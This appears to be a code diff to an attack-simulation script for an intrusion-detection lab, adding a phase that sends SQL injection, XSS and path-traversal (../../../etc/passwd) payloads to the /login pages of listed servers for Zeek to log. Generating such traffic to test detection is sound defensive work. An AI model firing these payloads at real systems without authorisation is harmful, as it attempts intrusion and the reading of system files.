@@ -36,6 +36,22 @@ def simulate_ssh_bruteforce(target_ip):
             except Exception:
                 pass
 
+def simulate_web_attacks(target_ip):
+    import requests
+    # List of malicious payloads (SQL Injection and XSS)
+    payloads = [
+        "1' OR '1'='1",              # Classic SQLi
+        "admin' --",                 # SQLi bypass
+        "<script>alert(1)</script>", # Classic XSS
+        "../../../etc/passwd"        # Path Traversal
+    ]
+    for payload in payloads:
+        try:
+            # Send payload in the query string
+            requests.get(f"http://{target_ip}/login", params={"user": payload}, timeout=1)
+        except Exception:
+            pass
+
 def main():
     logging.info("Starting SIMULATED ATTACK (Port Scan + SSH Bruteforce)...")
     
@@ -53,6 +69,14 @@ def main():
     with ThreadPoolExecutor(max_workers=10) as executor:
         for server in SERVERS:
             executor.submit(simulate_ssh_bruteforce, server)
+            
+    time.sleep(2)
+            
+    # 3. Web Attacks (SQLi / XSS)
+    logging.info("Phase 3: Executing Layer 7 Web Attacks (SQLi & XSS)...")
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        for server in SERVERS:
+            executor.submit(simulate_web_attacks, server)
             
     logging.info("Simulated attack completed. Check Zeek logs for anomalies.")
 
